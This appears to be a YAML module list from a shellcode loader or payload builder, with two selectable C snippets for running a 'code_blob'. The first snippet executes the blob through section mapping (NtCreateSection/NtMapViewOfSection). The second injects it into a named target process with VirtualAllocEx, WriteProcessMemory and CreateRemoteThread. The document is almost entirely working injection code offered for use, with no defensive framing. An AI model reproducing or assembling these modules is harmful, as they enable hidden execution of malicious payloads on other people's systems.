  - id: MpfProcessInjectionViaProcessReflection
    display: Process Reflection Injection
    default: false
    snippet: |
      // Process injection via NtCreateSection + NtMapViewOfSection
      {
          typedef NTSTATUS (NTAPI *pNtCS)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
          typedef NTSTATUS (NTAPI *pNtMVOS)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
          pNtCS NtCS = (pNtCS)GetProcAddress(ntdll, "NtCreateSection");
          pNtMVOS NtMVOS = (pNtMVOS)GetProcAddress(ntdll, "NtMapViewOfSection");
          if (NtCS && NtMVOS) {
              HANDLE hSection = NULL;
              LARGE_INTEGER secSize = {0};
              secSize.QuadPart = code_blob_len;
              if (NtCS(&hSection, SECTION_ALL_ACCESS, NULL, &secSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) >= 0) {
                  PVOID localBase = NULL;
                  SIZE_T viewSize = 0;
                  NtMVOS(hSection, GetCurrentProcess(), &localBase, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
                  if (localBase) {
                      memcpy(localBase, code_blob, code_blob_len);
                      PVOID remoteBase = NULL;
                      SIZE_T remoteSize = 0;
                      NtMVOS(hSection, GetCurrentProcess(), &remoteBase, 0, 0, NULL, &remoteSize, 2, 0, PAGE_EXECUTE_READ);
                      if (remoteBase) {
                          HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)remoteBase, NULL, 0, NULL);
                          if (hThread) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); }
                      }
                  }
                  CloseHandle(hSection);
              }
          }
      }

  - id: ClassicRemoteThread
    display: Classic Remote Thread Injection
    default: false
    snippet: |
      // Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
      {
          HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
          if (hSnap != INVALID_HANDLE_VALUE) {
              PROCESSENTRY32W pe32 = {sizeof(pe32)};
              DWORD targetPid = 0;
              if (Process32FirstW(hSnap, &pe32)) {
                  do {
                      if (_wcsicmp(pe32.szExeFile, L"$psname$") == 0) {
                          targetPid = pe32.th32ProcessID;
                          break;
                      }
                  } while (Process32NextW(hSnap, &pe32));
              }
              CloseHandle(hSnap);
              
              if (targetPid) {
                  HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
                  if (hProc) {
                      LPVOID remoteMem = VirtualAllocEx(hProc, NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                      if (remoteMem) {
                          SIZE_T written;
                          if (WriteProcessMemory(hProc, remoteMem, code_blob, code_blob_len, &written)) {
                              HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
                              if (hThread) {
                                  WaitForSingleObject(hThread, INFINITE);
                                  CloseHandle(hThread);
                              }
                          }
                      }
                      CloseHandle(hProc);
                  }
              }
          }
      }

